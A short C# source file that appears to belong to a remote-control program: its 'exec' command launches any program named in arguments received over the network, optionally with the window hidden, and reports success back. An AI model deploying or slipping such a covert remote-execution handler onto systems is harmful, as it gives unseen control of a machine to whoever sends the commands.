using System;
using System.Collections.Generic;
using System.Diagnostics;
using Shared;

namespace ServerCommands
{
    internal class Execute : ICommand
    {
        public string name { get; set; } = "exec";

        
        public void Process(List<string> args)
        {
            var startInfo = new ProcessStartInfo(args[0]);
            if (args.Count > 1)
            {
                if (args.Contains("hidden"))
                {
                    if (args.Count == 3)
                    {
                        startInfo.Arguments = args[1];
                    }
                    startInfo.WindowStyle = ProcessWindowStyle.Hidden;
                    startInfo.CreateNoWindow = true;
                }
            }

            try
            {
                System.Diagnostics.Process.Start(startInfo);
                ServerCommandsManager.networkManager.WriteLine("OK");
            }
            catch (Exception)
            {
                ServerCommandsManager.networkManager.WriteLine("KO");
            }
        }
    }
}
